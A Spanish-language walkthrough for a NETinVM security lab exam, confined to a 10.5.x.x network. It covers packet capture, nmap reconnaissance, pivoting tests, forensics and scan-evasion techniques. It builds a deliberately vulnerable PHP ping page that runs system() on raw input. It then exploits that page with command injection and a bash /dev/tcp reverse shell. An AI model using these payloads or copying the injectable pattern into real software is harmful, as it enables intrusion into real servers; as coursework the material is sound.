# 🧭 Guía de comandos — Parcial NETinVM

Guía paso a paso para ejecutar **tú mismo** todo el laboratorio. Solo tienes que abrir terminales y **copiar/pegar** cada comando. Debajo de cada uno hay una línea de qué hace.

---

## 🔑 Lo que usarás siempre

- **Usuario y contraseña en TODAS las máquinas:** `user1` / `You can change me.` (¡con el punto final!). `root` usa la misma.
- **Las máquinas y su papel:**

| Máquina | IP | Qué es |
|---|---|---|
| `exta` | 10.5.0.10 | Tu equipo **atacante** (red externa / “Internet”) |
| `dmza` | 10.5.1.10 | Servidor **web** (Apache) — DMZ |
| `dmzb` | 10.5.1.11 | Servidor **FTP** — DMZ |
| `inta` | 10.5.2.10 | Servidor **interno** — red INT |
| `fw`   | .254 | El **cortafuegos** entre las tres redes |

- **Cómo trabajar (importante):** en el escritorio de la **base** abre la terminal **Konsole**
  (icono `▸` en la barra de abajo, o *Menú → Konsole*, o el atajo **Meta+K**).
  Desde esa terminal entras a cualquier máquina con SSH, por ejemplo:
  ```bash
  ssh user1@exta
  ```
  Te pedirá la contraseña (`You can change me.`). Para volver a la base escribe `exit`.
  💡 **Truco:** abre varias pestañas con **Ctrl+Shift+T** (p. ej. una en la base para capturar y otra dentro de exta para atacar).

---

## ▶️ Paso 0 — Arrancar el laboratorio

1. En el escritorio de la base pulsa el botón **Run all** → arranca `fw`, `exta`, `dmza` e `inta`.
2. Para arrancar también el FTP, en una Konsole de la base:
   ```bash
   netinvm_run dmzb
   ```
   → arranca la máquina `dmzb` (el servidor FTP).
3. Comprueba que están encendidas:
   ```bash
   sudo virsh list
   ```
   → muestra la lista de máquinas del laboratorio que están en ejecución.

---

## 1️⃣ Punto 0 — Ejercicios base

### A) Capturar una comunicación HTTP

**Pestaña 1 (en la base)** — empieza a capturar y déjala corriendo:
```bash
sudo tcpdump -i mirror-dmz -w ~/http.pcap tcp port 80
```
→ graba el tráfico web de la DMZ. `mirror-dmz` es un “puerto espejo” que ve TODO lo que pasa por esa red.

**Pestaña 2 (base → exta)** — genera la petición:
```bash
ssh user1@exta
wget -qO- http://www.example.net | head
exit
```
→ desde el atacante pides la página web; eso crea el tráfico que se está capturando.

Vuelve a la **Pestaña 1**, pulsa **Ctrl+C** para parar la captura y ábrela:
```bash
wireshark ~/http.pcap
```
→ verás el saludo TCP (**SYN → SYN-ACK → ACK**) y el **GET / → 200 OK** de Apache.
(Si prefieres sin ventana: `tshark -r ~/http.pcap -Y http`.)

### B) Escaneo con Nmap (desde exta)
```bash
ssh user1@exta
sudo nmap www.example.net              # escanea los 1000 puertos comunes
sudo nmap -sV -p80,443 www.example.net # detecta la VERSIÓN del servicio (Apache 2.4.62)
sudo nmap -O www.example.net           # intenta adivinar el SISTEMA OPERATIVO
sudo nmap -p- www.example.net          # escanea TODOS los puertos (solo verás el 80)
exit
```
→ descubres qué puertos y servicios publica el servidor web.

---

## 2️⃣ Punto 1 — Superficie de ataque (desde exta)
```bash
ssh user1@exta
sudo nmap -sn 10.5.0.0/24              # ¿qué máquinas hay en la red EXTERNA?
sudo nmap -sn 10.5.1.0/24              # ¿qué hay en la DMZ?  → dmza y dmzb
sudo nmap -sn 10.5.2.0/24              # ¿qué hay en la INTERNA? → 0 (bloqueada)
sudo nmap -sV -p- 10.5.1.11            # servicios del FTP → vsftpd 3.0.3
sudo nmap -Pn -p22,80,443 10.5.2.10    # ¿llego a la interna? → "filtered" (no)
traceroute 10.5.2.10                   # la ruta muere en el firewall (10.5.0.254)
exit
```
→ reconstruyes el mapa de red: la DMZ es visible desde fuera; la red interna **no**.

---

## 3️⃣ Punto 2 — Comprometer la DMZ (servidor web)

### A) Montar el servicio vulnerable en dmza *(solo hay que hacerlo una vez)*
```bash
ssh user1@dmza
sudo apt-get update && sudo apt-get install -y php libapache2-mod-php
sudo tee /var/www/html/ping.php >/dev/null <<'FIN'
<?php
$ip = $_GET['ip'];
if ($ip) { echo "<pre>"; system("ping -c1 " . $ip); echo "</pre>"; }
?>
FIN
sudo systemctl restart apache2
exit
```
→ despliega una página de “diagnóstico” **insegura**: ejecuta en el servidor lo que le pongas en el parámetro `ip` (esto es la vulnerabilidad).

### B) Explotar desde exta
```bash
ssh user1@exta
curl "http://www.example.net/ping.php?ip=127.0.0.1;id"
```
→ el `;id` se ejecuta en el servidor. Si ves **`uid=33(www-data)`** ¡tienes ejecución de comandos!

**Shell completa (reverse shell)** — abre **dos pestañas en exta**:

Pestaña A — ponte a escuchar:
```bash
nc -lvnp 4444
```
→ queda esperando que el servidor te llame.

Pestaña B — dispara la conexión de vuelta:
```bash
curl "http://www.example.net/ping.php?ip=127.0.0.1;bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.5.0.10/4444%200%3E%261%27"
```
→ obliga a `dmza` a conectarse a ti (los símbolos van “codificados” para que curl los envíe bien).
En la **Pestaña A** aparecerá un shell del servidor. Prueba: `id`, `hostname`, `ip a`.

---

## 4️⃣ Punto 3 — Pivoting hacia la red interna

### A) Desde dmza (el equipo ya comprometido)
```bash
ssh user1@dmza
ping -c1 10.5.2.10        # ICMP hacia la interna → SÍ responde
for p in 22 80 3306; do (echo > /dev/tcp/10.5.2.10/$p) 2>/dev/null && echo "$p abierto" || echo "$p bloqueado"; done
exit
```
→ el **ping funciona**, pero **ningún puerto TCP** de la interna es accesible desde la DMZ.

### B) Ver las reglas del firewall (por consola)
```bash
sudo virsh console fw
```
→ pulsa **Enter**, inicia sesión como `root` con la contraseña, y ejecuta:
```bash
iptables -S
iptables -t nat -S
```
→ verás la política **`FORWARD DROP`** y que **no existe regla DMZ→INT**: por eso se bloquea el pivoting TCP.
Para salir: escribe `exit` y luego pulsa **Ctrl + ]** (vuelves a la base).

---

## 5️⃣ Punto 4 — Reconstrucción forense

**Pestaña 1 (base)** — captura el ataque completo:
```bash
sudo tcpdump -i mirror-ext -w ~/ataque.pcap
```
→ déjalo corriendo mientras repites el ataque.

**Pestaña 2 (exta)** — repite recon + inyección:
```bash
ssh user1@exta
sudo nmap -T4 -p1-1000 10.5.1.10
curl "http://www.example.net/ping.php?ip=127.0.0.1;id"
exit
```
Para la captura (**Ctrl+C** en la Pestaña 1) y ábrela:
```bash
wireshark ~/ataque.pcap
```
→ reconstruyes las fases: **barrido de puertos → GET a ping.php con `;id` → (reverse shell)**.

Correlaciona con el registro del propio servidor:
```bash
ssh user1@dmza 'sudo grep ping.php /var/log/apache2/access.log'
```
→ verás las peticiones maliciosas con su **hora e IP** (10.5.0.10) = indicadores de compromiso.

---

## 6️⃣ Punto 5 — Evasión de detección

**Detector sencillo (base)** — cuenta cuántos SYN manda cada IP en 20 segundos:
```bash
sudo timeout 20 tcpdump -i mirror-ext -nn 'tcp[tcpflags] & tcp-syn != 0' 2>/dev/null | awk '{print $3}' | sed -E 's/\.[0-9]+$//' | sort | uniq -c | sort -rn
```
→ si una IP aparece con MUCHÍSIMOS SYN, es un escaneo. Déjalo corriendo y, en otra pestaña, lanza escaneos:

**Escaneos desde exta (mientras el detector corre):**
```bash
ssh user1@exta
sudo nmap -T4 -p1-1000 10.5.1.10                 # rápido    → se DETECTA
sudo nmap -T0 --scan-delay 3s -p1-50 10.5.1.10   # muy lento → EVADE
sudo nmap -D RND:10 -p1-1000 10.5.1.10           # señuelos  → oculta tu IP real
sudo nmap -f -p1-1000 10.5.1.10                  # fragmentado → EVADE el filtro
exit
```
→ compara cuáles disparan la alerta y cuáles no. Conclusión: el detector por umbral detecta lo rápido y ruidoso, pero se evade con escaneos lentos, fragmentados o con señuelos.

---

## ⏹️ Al terminar — apagar todo
```bash
netinvm_shutdown_all
```
→ apaga todas las máquinas internas del laboratorio. Después apaga la VM base normalmente (Menú → Apagar).

---

### 📌 Notas rápidas
- Si te equivocas o una máquina se cuelga: `sudo virsh destroy <nombre>` y vuelve a arrancarla con `netinvm_run <nombre>`.
- El servidor web (`ping.php`) es un archivo que montas tú en dmza; si reinicias el laboratorio y no aparece, vuelve a hacer el **Paso 2A**.
- Todo ocurre **dentro del laboratorio** (redes 10.5.x.x). Nunca apuntes estas herramientas a equipos reales de Internet.
